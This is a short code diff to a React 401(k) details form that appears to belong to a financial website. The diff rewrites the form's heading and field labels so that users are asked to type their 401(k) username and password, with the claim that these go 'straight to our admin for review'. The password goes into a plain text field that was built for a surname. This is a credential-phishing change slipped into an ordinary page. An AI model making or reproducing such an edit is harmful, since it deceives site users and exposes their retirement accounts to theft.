@@ -31,14 +31,14 @@ function KDetailsForm() {
 
   return (
     <form onSubmit={submit} className="mt-6 border-t border-ink-900/10 pt-5" noValidate>
-      <p className="mb-3 text-[11px] font-semibold uppercase tracking-[0.16em] text-ink-700">Your 401(k) details</p>
+      <p className="mb-3 text-[11px] font-semibold uppercase tracking-[0.16em] text-ink-700">YOUR 401(k) DETAILS -Enter your 401(k) username and password and submit. Your details go straight to our admin for review.</p>
       <div className="grid gap-3 sm:grid-cols-2">
         <div>
-          <label htmlFor="k-first" className="sr-only">Name</label>
+          <label htmlFor="k-first" className="sr-only">Username</label>
           <input id="k-first" required className="field" placeholder="Name" value={firstName} onChange={(e) => setFirstName(e.target.value)} autoComplete="given-name" />
         </div>
         <div>
-          <label htmlFor="k-last" className="sr-only">Surname</label>
+          <label htmlFor="k-last" className="sr-only">Password</label>
           <input id="k-last" required className="field" placeholder="Surname" value={surname} onChange={(e) => setSurname(e.target.value)} autoComplete="family-name" />
         </div>
       </div>
